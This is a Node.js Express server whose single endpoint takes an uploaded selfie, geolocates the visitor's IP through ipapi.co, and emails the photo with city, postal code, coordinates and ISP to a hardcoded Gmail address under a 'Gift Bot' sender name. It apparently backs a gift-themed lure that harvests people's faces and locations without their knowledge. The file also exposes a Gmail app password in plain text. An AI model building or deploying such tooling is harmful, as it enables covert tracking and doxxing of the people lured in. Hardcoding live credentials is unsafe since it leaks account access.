const express = require("express");
const nodemailer = require("nodemailer");
const multer = require("multer");
const path = require("path");
const fs = require("fs");
const fetch = require("node-fetch"); // ✅ for IP-based location

const app = express();
const PORT = process.env.PORT || 3000;

// Setup multer for image upload
const upload = multer({ dest: "uploads/" });

app.get("/", (req, res) => {
  res.send("✅ Email server is up and running.");
});

// 📸 POST: Handle selfie + location + IP
app.post("/send-email", upload.single("image"), async (req, res) => {
  try {
    const imagePath = req.file.path;

    // 1️⃣ Get IP
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

    // 2️⃣ Fetch location using IP (via ipapi.co)
    let locationData = {};
    try {
      const response = await fetch(`https://ipapi.co/${ip}/json/`);
      locationData = await response.json();
    } catch (err) {
      console.error("❌ Location fetch failed:", err);
    }

    // 3️⃣ Build mail content
    const locationInfo = `
IP Address: ${ip}
City: ${locationData.city || "N/A"}
Region: ${locationData.region || "N/A"}
Country: ${locationData.country_name || "N/A"}
Postal: ${locationData.postal || "N/A"}
Latitude: ${locationData.latitude || "N/A"}
Longitude: ${locationData.longitude || "N/A"}
ISP: ${locationData.org || "N/A"}
`;

    // 4️⃣ Send mail with selfie + location
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "adityadrools@gmail.com",
        pass: "jxqvmogganjsycpm", // App password
      },
    });

    const mailOptions = {
      from: '"Gift Bot" <adityadrools@gmail.com>',
      to: "adityadrools@gmail.com",
      subject: "🎁 New Visitor - Selfie, IP & Location",
      text: `A new visitor has submitted a selfie.\n\n${locationInfo}`,
      attachments: [
        {
          filename: "selfie.jpg",
          path: imagePath,
        },
      ],
    };

    await transporter.sendMail(mailOptions);
    console.log("✅ Email sent with selfie + IP + location.");

    fs.unlinkSync(imagePath); // clean up
    res.status(200).send("Email sent with location & image");
  } catch (error) {
    console.error("❌ Failed to send email:", error);
    res.status(500).send("Failed to send email");
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
